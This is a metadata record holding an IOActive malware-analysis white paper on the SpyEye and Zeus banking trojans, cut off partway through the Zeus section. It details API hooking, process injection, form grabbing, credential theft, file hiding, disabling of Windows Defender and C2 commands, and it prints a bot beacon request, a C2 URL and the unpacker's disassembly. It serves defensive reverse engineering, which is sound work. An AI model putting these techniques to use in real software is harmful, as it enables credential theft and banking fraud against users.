{
    "id": "1d1aa787-ee93-461a-8a66-4e799024d62e",
    "created_at": "2022-10-25T16:48:23.996514Z",
    "updated_at": "2025-03-27T02:06:07.294882Z",
    "deleted_at": null,
    "sha1_hash": "19f7e688091f5b60f9446a9bb517f6711da9f2bb",
    "title": "Microsoft Word - ZeusSpyEyeBankingTrojanAnalysis.docx",
    "authors": "",
    "file_creation_date": "2012-01-11T12:56:30Z",
    "file_modification_date": "2012-01-11T12:56:30Z",
    "file_size": 223700,
    "plain_text": "Seattle, WA 98104\n\n\n### SOFTWARE\n\n ASSURANCE\n\n# Technical White Paper\n\n## Reversal and Analysis of Zeus and SpyEye Banking Trojans\n\nIOActive, Inc.\n\n701 5th Avenue, Suite 6850\n\nSeattle, WA 98104\n\n\n-----\n\n# Contents\n\nIntroduction ................................................................................................................................................... 1\n\nSpyEye Malware Analysis ............................................................................................................................. 1\n\nInitialization ............................................................................................................................................ 1\n\nAPI Calls ................................................................................................................................................ 4\n\nAPI Hooking ........................................................................................................................................... 4\n\nProcess Injection .................................................................................................................................... 5\n\nKeystroke Logging ................................................................................................................................. 6\n\nForm Grabbing ....................................................................................................................................... 6\n\nCredentials Theft .................................................................................................................................... 7\n\nFile and Registry Hiding ......................................................................................................................... 8\n\nServer Response Commands ................................................................................................................ 9\n\nAnti-debugging Techniques ................................................................................................................. 10\n\nZeus Malware Analysis ............................................................................................................................... 12\n\nZeus Portable Executable Encryption Summary ................................................................................. 12\n\nInitialization .......................................................................................................................................... 13\n\nProcess Injection .................................................................................................................................. 15\n\nHidden Files ......................................................................................................................................... 16\n\nFile Encryption ..................................................................................................................................... 17\n\nMutexes ............................................................................................................................................... 19\n\nRegistry Entries .................................................................................................................................... 22\n\nFTP and POP3 Credential Theft .......................................................................................................... 22\n\nServer Response Format ..................................................................................................................... 22\n\nCertificate Stealing ............................................................................................................................... 24\n\nBrowser Injection and Hijacking ........................................................................................................... 24\n\nCookie Stealing .................................................................................................................................... 26\n\nAvailable Zeus Commands .................................................................................................................. 26\n\nConclusion .................................................................................................................................................. 28\n\nReferences .................................................................................................................................................. 29\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\n# Introduction\n\nCompany engaged IOActive, Inc (IOActive) to perform a reversal and analysis of the\nbanking Trojans SpyEye and Zeus.\n\nAlthough the core functionality of SpyEye is similar to its main rival Zeus, SpyEye\nincorporated many advanced tricks to try and hide its presence on the local system. This\ndocument includes a deep technical analysis of the bot's advanced hooking and injection\nmechanisms as well as its core functionality used to hijack and steal user information.\n\nZeus is an advanced piece of malware, so getting it to a reversible state was not a trivial\nexercise since it incorporates multiple layers of custom, portable, executable encryption.\nIOActive reverse engineers stripped each encryption layer and rebuilt the executable to\nallow for proper disassembly. Once Zeus was in an unpacked state, consultants identified\nadditional roadblocks including non-existent import address tables, obfuscated string tables,\nand relocated code. Zeus included many methods to hinder reverse engineering.\n\n# SpyEye Malware Analysis\n\n### Initialization\nThe unpacked SpyEye bot image can begin execution either at the entry point specified in\nits Portable Executable header, at a private (non-exported) hook procedure executed when\nthe bot has injected itself into a new process, or at one of two private thread routines that\nexecute when the bot has injected itself into an existing process.\n\nIn the first case (when the bot is running as a standalone application), the bot attempts to\ncreate a mutex named __CLEANSWEEP__ and terminates if it exists already. Otherwise, it\nextracts config.dat from config.bin, which is a ZIP file with the PK signature overwritten\nand a 32-character, uppercase hexadecimal string as the password. The decompressed\nconfig.dat file is expected to have a size of 13,005 bytes and contains the following\nfields:\n\n+0000h [1000] ActionUrl (e.g.,\n\"http://localhost/spyeye/main/bt_version_checker.php\")\n\n+03E8h [1000] ActionUrl2 (e.g.,\n\"http://localhost/spyeye/main/bt_version_checker.php\")\n\n+07D0h [1000] LatestExeUrl (e.g.,\n\"http://localhost/spyeye/main/bt_getexe.php\")\n\n+0BB8h [1000] KnockHdrs (e.g.,\n\"http://localhost/spyeye/main/bt_knock_hdrs.php\")\n\n+0FA0h [1000] RightTimeUrl (e.g.,\n\"http://localhost/spyeye/main/datetime.php\")\n\n+1388h [1000] IncHistoryUrl (e.g.,\n\"http://localhost/spyeye/main/bin/page0.html\")\n\n+1770h [1000] CurrentUaUrl (e.g.,\n\"http://localhost/spyeye/main/bin/ua.html\")\n\n\n+1B58h [1000] ClickBnkUrl (e.g.,\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\n\n\"http://localhost/spyeye/main/bt_plg_clkbnk_ct.php\")\n\n\n+1F40h [1000] KvipUrl (e.g.,\n\"http://localhost/spyeye/main/bt_plg_kvip.php\")\n\n\n+2328h [1000] CheckUrl (e.g., \"http://www.microsoft.com\")\n\n\n+2710h [1000] FormgrabberHostUrl (e.g., \"localhost\")\n\n\n+2AF8h [1000] FormgrabberPathUrl (e.g.,\n\"http://localhost/spyeye/formgrabber/websitechk.php\")\n\n+2EE0h [1000] FormgrabberPath2Url (e.g.,\n\"http://localhost/spyeye/formgrabber/websitechk.php\")\n\n+32C8h DWORD  connector interval in milliseconds (e.g.,\n300,000)\n\n\n+32CCh BYTE  kill Zeus flag\n\n\nThe bot then checks the result of GetModuleFileNameA(NULL) to determine whether it is\nrunning from its preferred location. If not, the bot attempts to update itself by:\n\n - Creating its home directory—%SystemRoot%\\cleansweep.exe\\ or\n%SystemDrive%\\cleansweep.exe\\—by using CreateDirectoryA.\n\n - Setting the file times that were modified, created, and accessed on the directory to\nmatch those of ntdll.dll.\n\n - Downloading from LatestExeUrl to cleansweepupd.exe with the API calls\nInternetOpenA(\"Microsoft Internet Explorer\"),\nInternetOpenUrlA(INTERNET_FLAG_NO_CACHE_WRITE),\nInternetQueryDataAvailable, and InternetReadFile.\n\n**Note  The file times on cleansweepupd.exe also are set to match those of ntdll.dll.**\n\nAssuming that the update process was successful, the bot calls\nCreateMutexA(\"__CLEANSWEEP_UNINSTALL__\") to force any running instances of the bot\nto unload, calls CreateProcessA to run cleansweepupd.exe, and then terminates.\n\nIf the bot is running from its preferred location, it attempts to inject itself first into processes\nnamed explorer.exe and then into all processes if that first attempt fails before\nterminating. The bot discovers processes of interest using\nCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS), Process32First, and\nProcess32Next; refer to the section \"Process Injection\" for a detailed discussion.\n\nIn the cases where the bot image is injected into a process, it executed by way of a call to\nCreateRemoteThread through the injector at one of two possible thread routines.\n\n**Possibility 1. For injections performed by a bot instance that was executed like an**\napplication—that is, beginning execution at its entry point—injected instances execute at\na thread routine that establishes a master instance. The thread routine calls\nCreateMutexA(\"__CLEANSWEEP__\") to preclude other instances from running as\napplications and then sets a registry string value named cleansweep.exe in the\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\nHKEY_CURRENT_USER\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN registry\nkey to execute the bot each time the user logs in, thereby making the bot persistent.\n\nDepending on the bot's configuration, the thread routine may attempt to shut down active\nZeus installations on the system by ordering Zeus to shut itself down by way of its\nnamed pipe and deleting its executable [1]. The bot then disables Windows Defender by\nloading %ProgramFiles%\\Windows Defender\\MpClient.dll and calling\nWDEnable(FALSE). The thread routine injects the bot into all processes and continues to\nperform periodic injects if GetModuleHandleA(NULL) indicates that the bot instance is\nhosted in an explorer.exe process.\n\n**Possibility 2. If the bot begins execution at the second thread routine or at the hook**\nprocedure mentioned in Possibility 1, it follows a different initialization sequence that\ninvolves contacting FormgrabberPathUrl then installing Detours hooks at the entry\npoints of the following API functions:\n\n\nNTDLL!NtQueryDirectoryFile\n\n\nNTDLL!NtVdmControl\n\n\nNTDLL!NtEnumerateValueKey\n\n\nNTDLL!NtResumeThread\n\n\nNTDLL!LdrLoadDll\n\n\nuser32.dll!TranslateMessage\n\n\nwininet.dll!InternetCloseHandle\n\n\nwininet.dll!HttpSendRequestA\n\nwininet.dll!HttpSendRequestW\n\n\nnspr4.dll!PR_Write (called by Firefox)\n\n\nws2_32.dll!send\n\n\nAdvapi32.dll!CryptEncrypt\n\n\nTo obtain NTDLL's base address, the bot uses a variation on a trick common to\nshellcode: it accesses\n\n° CONTAINING_RECORD( NtCurrentTeb() → Peb → Ldr →\nInInitializationOrderModuleList.Flink\n\n° LDR_MODULE\n\n° InInitializationOrderModuleList ) → BaseAddress\n\nrather than calling any API function or conducting a more careful search of the loaded\nmodule list.\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\nAfter the bot installs hooks, it finishes initialization by creating a thread that reads the bot's\nconfiguration and then loops until OpenMutexA(\"__CLEANSWEEP_UNINSTALL__\") succeeds,\nat which point the thread uninstalls all hooks and exits.\n\n### API Calls\nThe SpyEye bot employs a variety of tricks to evade API hooks—measures that also thwart\nattempts to set breakpoints on certain API functions used by the bot, which constitutes a\ndegree of anti-debugging. The author refers to some of these tricks as antisplicing and\npoints out that they prevent SpyEye bots communication with their server from being\nintercepted by the Zeus bot.[1]\n\nThe bot makes some API calls by way of imports or a standard GetProcAddress-based\nlookup, while at other times it looks up the functions more furtively. The bot's simplest trick\nis to use its own GetProcAddress implementations to look up exported functions either by\nname or by way of a 32-bit ROL-7-XOR hash of the name. In some places, the API name\nand/or library name string is built or decoded into a buffer at run time.\n\nThe bot's most elaborate trick involves mapping a separate, executable view into memory\nof the image that is hosting an API of interest by using RtlInitUnicodeString,\nNtOpenFile(GENERIC_READ), NtQueryInformationFile(FileStandardInformation) to\nget the file's size, NtCreateSection(SEC_IMAGE), and NtMapViewOfSection.\n\nThe bot then executes the code that belongs to the API of interest from within this\ntemporary view; however, relocations are not applied, so the code ultimately may access\ncode and global data that resides in the legitimately-loaded instance of the same image\n(assuming the image is loaded at its default base address). Because the API function\nbegins execution in this temporary, dynamically-loaded image, the bot avoids import hooks,\nDetours hooks (including its own), and typical breakpoints when performing API calls in this\nway. The bot's current implementation of this technique supports API calls into the following\nlibraries:\n\nkernel32.dll advapi32.dll ole32.dll user32.dll\n\nwininet.dll oleaut32.dll shlwapi.dll msvcrt.dll\n\nshell32.dll ntdll.dll imagehlp.dll urlmon.dll\n\nws2_32.dll\n\n### API Hooking\nThe bot hooks each of the API functions mentioned previously through the use of standard\nDetours hooks. It disassembles the instructions at the target function's entry point until it\nhas determined that at least 5bytes of consecutive instructions are suitable for relocation.\n\n**Note  The bot will not attempt to relocate Jcc rel8 or LOOPcc rel8 instructions,**\nalthough it will relocate and adjust JMP rel32 and CALL rel32 instructions.\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\nIf the bot disassembles a JMP rel32 instruction, it disassembles at the JMP's destination\nfor, at most, 4KB or until it encounters a RET or INT 3 instruction—searching for an INC\nEAX / DEC EAX (40h/48h) sequence that serves as the signature of the bot's hook\nprocedures. If it finds the signature, it assumes that the API function is hooked already and\navoids re-hooking the function.\n\nIt is possible that to avoid triggering memory breakpoints the bot copies the original prolog\ncode into a private buffer by way of a call to NtWriteVirtualMemory then manually\nappends a JMP rel32 instruction that returns execution to the hooked function so that the\nrelocated prolog code can be called as a trampoline function by the hook procedure. The\nbot then marks the memory that contains the target function's entry point as writable by\nusing NtProtectVirtualMemory({0x1000}, PAGE_EXECUTE_READWRITE)—note that it\ndoes not restore the original page permissions—and overwriting the first five bytes of the\nfunction with a JMP rel32 instruction to direct execution to the hook procedure.\n\nWhen the bot is instructed to remove itself from memory, it uninstalls these Detours hooks\nby calling NtProtectVirtualMemory({0x1000}, PAGE_EXECUTE_READWRITE) at the\nhooked function's entry point and restores the function's original prolog code using\nNtWriteVirtualMemory.\n\n### Process Injection\nThe bot contains separate mechanisms for injecting itself into both existing processes and\nnew processes that are created by a process in which an instance of the bot resides.\n\n   - With an existing process, the bot copies itself into the process (see below) and\nexecutes one of two possible thread routines by using CreateRemoteThread.\n\n   - With a new process, the bot hooks NtResumeThread—which is called by Windows to\nexecute a newly-created process (and in some circumstances when a process is\nbeing debugged)—and performs injection at that point.\n\nThe goal of the NtResumeThread procedure is to hook a new process' application entry\npoint immediately before the process beings executing calls\nNtQueryInformationThread(ThreadBasicInformation) to obtain the process ID of the\n(presumably) nascent process, which it then opens using\nOpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_WRITE|PROCESS_VM_READ|PRO\nCESS_VM_OPERATION|PROCESS_CREATE_THREAD).\n\nTo find the application entry point, the NtCreateThread hook procedure calls\nGetThreadContext({CONTEXT_FULL}) then calls GetThreadSelectorEntry given the\nthread's SegFs selector. From that result, it determines the base address of the thread's\nTIB, from which it reads the first 0B2Ch bytes by way of ReadProcessMemory, then uses\nthe PEB base address recorded in the TIB to read the first 1E8h bytes of the PEB, also by\nway of ReadProcessMemory.\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\nIn turn, the PEB contains the base address of the application image, which leads to the\napplication entry point by way of the Portable Executable header. With this information and\nstarting at the entry point, the hook procedure\n\n   - Reads 4KB of memory by using NtReadVirtualMemory.\n\n   - Disassembles and copies the necessary length of prolog code as usual, except it\nnecessarily uses NtReadVirtualMemory to access the memory of the target process.\n\n   - Installs the hook using NtProtectVirtualMemory(PAGE_EXECUTE_READWRITE) and\nNtWriteVirtualMemory.\n\nWhen the application entry point hook procedure executes, it removes the hook with\nNtProtectVirtualMemory(PAGE_EXECUTE_READWRITE) and NtWriteVirtualMemory.\n\nTo inject its own image into a remote process, the bot attempts to acquire\nSeDebugPrivilege by calling RtlAdjustPrivilege(20, TRUE) and then tries to open\nthe target process with\nNtOpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_WRITE|PROCESS_VM_READ|P\nROCESS_VM_OPERATION|PROCESS_CREATE_THREAD) or OpenProcess if the first attempt\nfails.\n\nIf successful, it tries to allocate memory (of the size indicated in its Portable Executable\nheader's SizeOfImage field) for its image in the remote process using\nVirtualAllocEx(PAGE_EXECUTE_READWRITE, MEM_COMMIT|MEM_RESERVE), first\nspecifying the injecting instance's own base address and then successive base addresses\nstarting at 0EA00000h and increasing by the size of the image.\n\nThe bot copies itself 4KB at a time into the allocated memory, repeatedly calling\nVirtualQueryEx to verify that the destination memory is not marked PAGE_NOACCESS or\nPAGE_GUARD; VirtualProtectEx(PAGE_EXECUTE_READWRITE) to ensure that the\ndestination is writable; and WriteProcessMemory to copy 4KB of its image. Finally, the bot\napplies relocations one at a time according to its own base relocations table, calling\nReadProcessMemory(4) and WriteProcessMemory(4) for each.\n\n### Keystroke Logging\nSpyEye logs keystrokes using a TranslateMessage hook: in response to each\nWM_KEYDOWN message the hook procedure calls GetKeyboardState and ToUnicode(lpMsg\n→ wParam), then appends the corresponding wide character (up to a maximum of 19,999\nwide characters) to a 20,000-byte buffer.\n\n### Form Grabbing\nThe bot hooks HttpSendRequestA and HttpSendRequestW to intercept content-bearing\nHTTP requests (usually POST requests) made by Internet Explorer-based browsers. If the\nintercepted function call supplies a non-zero dwOptionalLength, the hook procedure:\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\n   - Retrieves the requested URL using\nInternetQueryOptionA(INTERNET_OPTION_URL).\n\n   - Accesses the User-Agent string stored previously by the InternetCloseHandle hook\nprocedure.\n\n   - Reads all HTTP requests headers by way of\nHttpQueryInfoA(HTTP_QUERY_FLAG_REQUEST_HEADERS|HTTP_QUERY_RAW_HEADERS_\nCRLF).\n\n   - Copies the form data from lpOptional.\n\n   - Includes any keystrokes collected by the TranslateMessage hook procedure since\nthe last intercepted HTTP request was reported.\n\nThis package is then uploaded to the bot server as a manually-constructed HTTP POST\nrequest sent directly using Winsock:\n\n(WSAStartup(0x202), socket(AF_INET, SOCK_STREAM, IPPROTO_TCP),\ngethostbyname('FormgrabberHostUrl'), connect({htons(80)}), and\nsend).\n\nThe bot receives the server's response and performs basic parsing to check for an HTTP\n200 status code.\n\nTo intercept HTTP requests sent from Firefox, the bot hooks the PR_Write function of the\nNSPR4.DLL (Netscape Portable Runtime) library. From this vantage point, the bot can read\nthe complete, raw HTTP request after it is assembled, but before it is SSL-encrypted.\n\nThe hook procedure computes a 32-bit CRC of the intercepted HTTP request and\ncompares it to the last eight requests it intercepted. If there is a match, the request is\npresumably redundant and is ignored; otherwise, the hook procedure acts based upon the\nHTTP METHOD. If the request is a GET request, the bot searches it for a\n\\r\\nAuthorization: Basic string and, if found, submits the entire request plus the base64-decoded credentials to the bot server.\n\nThe hook procedure submits HEAD, POST, PUT, DELETE, TRACE, OPTIONS, and\nCONNECT requests to the server without any additional checks or processing.\n\n### Credentials Theft\nThe bot attempts to generically intercept plaintext FTP, POP3, and HTTP (basic\nauthorization) credentials by hooking the Winsock send function. The hook procedure calls\ngetpeername to ascertain the server-side port number to which the data is being sent: for\nFTP data sent to port 21, the hook procedure examines buffers at least six characters in\nlength for an initial USER or PASS command and extracts the user name or password\nrespectively. Once it has both, the hook procedure obtains the server's IP address using\ngetpeername and inet_ntoa, and submits a string of the form\nftp://<user>:<password>@<ipaddress> to the bot server by way of the same means the\nbot uses to submit form-grabber data.\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\nFor POP3 data (port 110), the hook procedure records the user names and passwords of\nUSER and PASS commands, and also examines buffers that are at least 12 characters in\nlength for an initial AUTH PLAIN command. If found, the hook procedure base-64 decodes\nthe next POP3 buffer sent that does not begin with one of the three commands of interest,\nand regards the second (authcid) and third (passwd) null-delimited strings from the result\nas the user name and password, respectively.[2] Once it has both a user name and a\npassword, the hook procedure submits a string of the form POP3 :\n<user>:<password>@<ipaddress> to the bot server.\n\nFor HTTP data (port 80), the hook procedure searches the entire sent buffer for the string\n\\r\\nAuthorization: Basic and, if found, extracts the data that follows, stopping at the\nnext \\r\\n sequence or at the end of the buffer and then submitting the base-64-decoded\ndata to the bot server.\n\n### File and Registry Hiding\nThe bot's NtQueryDirectoryFile and NtVdmControl hooks call the original API function\nthen inspect the returned data for any record that describes a file or directory named\ncleansweep.exe or config.bin.\n\n**Note  The files named cleansweepupd.exe are not hidden.**\n\nTo effectively remove a matching record from the listing, the hook procedure increases the\nNextEntryOffset field of the preceding non-matching record so that the matching record\nis skipped by the caller. If the final record(s) match the file names to be hidden, the\nNextEntryOffset field of the final non-matching record is zeroed. If the data returned by\nthe original function comprises only matching records, the hook procedure instead returns\nthe error STATUS_NO_SUCH_FILE to the caller.\n\nThe NtQueryDirectoryFile hook procedure recognizes the following file information classes:\n\nFileDirectoryInformation FileFullDirectoryInformation\n\nFileBothDirectoryInformation FileNamesInformation\n\nFileOleDirectoryInformation FileContentIndexInformation\n\nThe NtVdmControl hook regards data returned in response to a VdmDirectoryFile control\ncode as being in FileDirectoryInformation format.\n\nThe bot's NtEnumerateValueKey hook calls\nNtEnumerateValueKey(KeyValueBasicInformation) and inspects each record prior to\nthe record that was indexed by the caller to determine whether it mentions the registry\nvalue cleansweep.exe. The hook procedure increments the index for each record found so\nthat they are skipped silently then calls the original NtEnumerateValueKey with the original\ninformation class and the adjusted index.\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\n### Server Response Commands\nAt a configurable interval, the bot sends information about its installation to the server in a\nrequest that resembles the following:\n\nGET\n/spyeye/main/bt_version_checker.php?guid=<username>!<hostname>!<s\nystem_volume_serial>&ver=10070&stat=ONLINE&cpu=<cpu_utilization>&\nccrc=<crc32_from_config.bin> HTTP/1.0\n\n\nHost: <botserver>\n\n\nUser-Agent: Microsoft Internet Explorer\n\n\nOnce an hour the bot sends its request to\n\n<http://www.microsoft-windowssecurity.com/software/updater3/bt_version_checker.php>\n\nThe conspicuous User-Agent string shown above is hardcoded and might provide a good\nopportunity to detect bot traffic. The bot uses:\n\n - InternetOpenA(\"Microsoft Internet Explorer\")\n\n - InternetOpenUrlA(INTERNET_FLAG_NO_CACHE_WRITE)\n\n - InternetQueryDataAvailable, InternetReadFile\n\n - InternetCloseHandle\n\nto send the request, so it is implicitly sent by way of any configured proxy and could use\nHTTPS; however, the InternetOpenUrl flags to ignore certificate errors are not specified,\nso the SSL certificate would have to be both valid and trusted, which is unlikely.\n\nThe bot obtains the user name, host name, and serial number by calling GetUserNameA,\nGetComputerNameA, and GetVolumeInformationA respectively based on the result of\nGetSystemWindowsDirectoryA.\n\nCPU utilization is determined by computing the differences in current time—obtained from\nNtQuerySystemInformation(SystemTimeOfDayInformation)—and idle time—obtained\nfrom NtQuerySystemInformation(SystemPerformanceInformation)—after a call to\nSleep(1000), which is then divided by the number of processors on the system (obtained\nfrom NtQuerySystemInformation(SystemBasicInformation)). The CRC-32 field is\nsimply the last DWORD of the current config.bin file.\n\nThe server may respond to this request with one of the following commands:\n\n - **UPDATE, which causes download and execution of a new bot executable to**\ncleansweepupd.exe, and removal of the old bot as signaled with\nCreateMutexA(\"__CLEANSWEEP_UNINSTALL__\").\n\n - **UPDATE_CONFIG, which causes download and process of a new config.bin as**\nsignaled with CreateMutexA(\"__CLEANSWEEP_RELOADCFG__\").\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\n   - **FILL, which instructs the bot to attempt placing an order by way of FastSpring or**\nsetSystems using a provided payment card account.\n\n   - **LOAD, which communicates a loader task that instructs the bot to download and**\nexecute a program with CreateProcessA.\n\n   - **KNOCK, which communicates a knocker task that instructs the bot to make requests**\nto a given URL with a supplied set of headers.\n\nThe remainder of this section discusses implementation of the FILL command.\n\nAlthough the bot server claims to support setSystems (setsystems.com), eSellerate\n(esellerate.net), FastSpring (fastspring.com), ClickBank (clickbank.com), ShareIt\n(shareit.com), AlertPay (alertpay.com), securebillingsoftware (now defunct), and KinoVIP\n(kinovip.com), the bot itself appears to support only FastSpring and setSystems.\n\nGiven payment card information (card number, card security code, expiration date, name,\naddress, phone number, and email address) and the URL of a target web site that\nimplements one of these two payment methods, the bot instantiates an Internet Explorer\nWebBrowser control using CoCreateInstance(CLSID_WebBrowser, IID_IWebBrowser2)\nand then painstakingly, programmatically browses the web page to locate and manipulate\nvarious elements by way of IHTMLDocument-, IHTMLElement-, IHTMLStyle-,\nIHTMLWindow-, and IWebBrowser-family COM interfaces.\n\nOne conspicuous feature of note is the bot's capability to add websites to Internet\nExplorer's Trusted Sites zone. It does this by setting the\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\nSettings\\Zones\\2 key's Flags value to 00000043h—which allows the addition of\nwebsites to the zone (bit 1) and disables the requirement that added sites use HTTPS (bit\n2)—then calling CoCreateInstance(CLSID_InternetSecurityManager and\nIID_IInternetSecurityManager), and invoking the SetZoneMapping method of the\nresulting object to trust the site.\n\n### Anti-debugging Techniques\nAlthough the author of SpyEye claims that the bot executable includes anti-debugging\ntechniques[1], IOActive observed no specific anti-debugging measures in the unpacked\nimage. Interference with the debugger arose as a presumably unintentional side effect of\nthe NtResumeThread hook that was associated with process injection: each time an\ninfected debugger resumed a thread in the debuggee process (which occurs during the\noperation of debuggers such as Windbg), the infected debugger attemptd to re-inject the\nbot into the debuggee. This conflict could have been sidestepped by running the debugger\nas an administrator within a regular, unprivileged user's session, which would prevent the\ndebugger from becoming infected.\n\nThe bot functionality that can most nearly be considered as an anti-debugging technique is\nthe manner in which the bot calls some API functions. Whenever the bot code invokes\ncertain API functions, it first uses NtMapViewOfSection to map a separate view of the DLL\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\nthat hosts the API and then calls the API function's entry point within that view. This allows\nthe bot to bypass user-mode Detours hooks—including its own—on the API functions called\nin this way, and incidentally allows it to avoid triggering any breakpoints set on the function\nentry points as well. This technique can present a challenge to user-mode debugging when\nbreaking on certain API calls, but can be worked around by setting different breakpoints\n(especially in the kernel-mode code for native API calls), in other internal functions that the\nbot does not call in this way, or in the bot code itself.\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\n# Zeus Malware Analysis\n\n### Zeus Portable Executable Encryption Summary\nZeus implements customized, portable, executable encryption that incorporates multiple\nencryption layers, each of which decrypts the next section. Zeus allocates memory on the\nheap using VirtualAlloc, copies the current decrypted layer to the heap, and then\nexecutes. Each layer implements a slightly different obfuscation method, which can include\nROR- and XOR-based schemes.\n\nThe first layer implements addition-based obfuscation:\n\n.text:0040487C loc_40487C:               ; CODE\nXREF: sub_4047FE+B8j\n.text:0040487C         mov   bh, [esi] ; retrieve\nencrypted byte\n\n.text:0040487E         add   esi, 1\n.text:00404881         add   bh, bl\n.text:00404883         add   bh, dl\n.text:00404885         mov   [edi], bh ; store\ndecrypted byte\n.text:00404887         inc   edi\n.text:00404888         push  edx\n.text:00404889         push  ecx\n.text:0040488A         push  0        ;\nlpModuleName\n.text:0040488C         call  ds:GetModuleHandleA ; get\nbase address of system proc\n.text:00404892         pop   ecx\n.text:00404893         pop   edx\n.text:00404894         and   eax, 0FFh\n.text:00404899         add   eax, 4\n.text:0040489C         shr   edx, 8\n.text:0040489F         inc   ebp\n\n.text:004048A0         cmp   ebp, eax\n.text:004048A2         jnz   short loc_4048B0\n.text:004048A4         mov   ebp, 0F5DC7E46h\n.text:004048A9         mov   edx, ebp\n.text:004048AB         mov   ebp, 0\n.text:004048B0\n.text:004048B0 loc_4048B0:               ; CODE\nXREF: sub_4047FE+A4j\n.text:004048B0         sub   ecx, 1      ; ecx =\ncounter\n.text:004048B3         cmp   ecx, 0      ; any\nbytes left to decrypt?\n.text:004048B6         jnz   short loc_40487C ; loop if\nso\n.text:004048B8         pop   eax\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\n.text:004048B9         mov   edx, eax ; edx\nstores decrypted layer\n.text:004048BB         jmp   edx ; jump to\ndecrypted code\n\nSince developing a custom, executable decryption method is not an optimal method to\ndecrypt encrypted executables, IOActive dumped the unpacked executable once it had\ndecrypted itself in memory by running the bot under a debugger and tracing each\nobfuscation layer. A breakpoint was then set on each jmp [reg] instruction since that was\nthe method used to jump between decrypted layers. Once all the layers were decrypted and\nthe fully functional, portable executable was in memory, the executable was dumped to disk\nand the entry point was changed so that it pointed to the section of decrypted code.\n\nBecause Zeus injects a DLL into various processes, retrieving the decrypted DLL was a\nmore straightforward process and IOActive checked the first instructions of hooked\nfunctions and identified the target memory page. For example, using the debugger WinDbg:\n\n\n0:000> u ntdll!ZwCreateThread L1\n\n\nntdll!ZwCreateThread:\n\n\n7c90d7d2 e955962784 jmp 00b86e2c\n\n\nYou can see the first instruction comprises a jmp to the location 0x00b86e2c. One can then\nissue the !address command to see what memory region this occupies:\n\n\n0:000> !address 00b86e2c\n\n\n00b70000 : 00b70000 – 00026000\nType 00020000 MEM_PRIVATE\nProtect 00000040 PAGE_EXECUTE_READWRITE\nState 00001000 MEM_COMMIT\n\nIOActive verified that the memory location was the start of the PE header and then dumped\nthe DLL to disk using the writemem command:\n\n\n0:000> .writemem C:\\Malwares\\00b70000.bin b70000 L26000\n\n\nWriting 26000 bytes\n\n\n### Initialization The unpacked Zeus bot image can begin execution either at the entry point specified in its Portable Executable header or at one of two private (non-exported) thread routines. In all cases, the bot begins by locating the image base address of KERNEL32:\n\n\nCONTAINING_RECORD(\n\n\nNtCurrentTeb()->Self->Peb>Ldr>InInitializationOrderModuleList>Flink,\n\n\nLDR_MODULE,\n\n\nInInitializationOrderModuleList )->BaseAddressActual\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\nThis technique is common among shellcode and other less orthodox, custom loaders; it\nassumes that KERNEL32 always will be the second module in the initialization-order\nmodule list. With this base address, the bot locates KERNEL32's LoadLibraryA and\nGetProcAddress exports, and uses them to look up numerous API functions from various\nWindows libraries.\n\nAt a late stage of initialization, the bot examines KERNEL32's import directory to locate the\nfunction pointer associated with its NTDLL!NtCreateThread import, which the bot then\nreplaces with a pointer to its own NtCreateThread hook.\n\n**Note  KERNEL32 on Windows Vista instead calls NTDLL!NtCreateThreadEx, which the**\nbot is not currently written to accommodate.\n\nThe bot then enumerates all loaded modules (excluding itself, as it does not appear in the\nloaded modules list) with CreateToolhelp32Snapshot, Module32FirstW, and\nModule32NextW and installs a number of import hooks in each. Specifically, it hooks\nimports (but not bound imports) of the following API functions:\n\n\nntdll.dll!NtCreateThread\n\n\nntdll.dll!LdrLoadDll\n\n\nntdll.dll!LdrGetProcedureAddress\n\n\nntdll.dll!NtQueryDirectoryFile\n\n\n(Note that the WSOCK32.DLL name is actually given as it appears\n\n\nbelow, \"wsocks32.dll\", which prevents the following hooks from\nbeing successfully applied.)\n\n\nwsocks32.dll!send (#19)\n\n\nwsocks32.dll!sendto (#20)\n\n\nwsocks32.dll!closesocket (#3)\n\n\nws2_32.dll!send\n\n\nws2_32.dll!sendto\n\n\nws2_32.dll!WSASend\n\n\nws2_32.dll!WSASendTo\n\n\nws2_32.dll!closesocket\n\n\nwininet.dll!HttpSendRequestW\n\nwininet.dll!HttpSendRequestA\n\nwininet.dll!HttpSendRequestExW\n\nwininet.dll!HttpSendRequestExA\n\n\nwininet.dll!InternetReadFile\n\n\nwininet.dll!InternetReadFileExW\n\nwininet.dll!InternetReadFileExA\n\n\nwininet.dll!InternetQueryDataAvailable\n\n\n-----\n\n_Reversal and Analysis of the Zeus and SpyEye Banking Trojans_\n\n\nwininet.dll!InternetCloseHandle\n\n\nwininet.dll!HttpQueryInfoA\n\nwininet.dll!HttpQueryInfoW\n\nuser32.dll!TranslateMessage\n\nuser32.dll!GetClipboardData\n\n\ncrypt32.dll!PFXImportCertStore\n\n\n### Process Injection\nThe bot injects itself into processes by way of two separate methods:\n\n   - Hijacking creation of the first thread in a new process.\n\n   - Injecting a new thread into certain existing processes.\n\nThread hijacking is accomplished by the bot's NtCreateThread import hook, which calls\nNtQueryInformationProcess(ProcessBasicInformation) on the process in which the\nthread will be created. If the 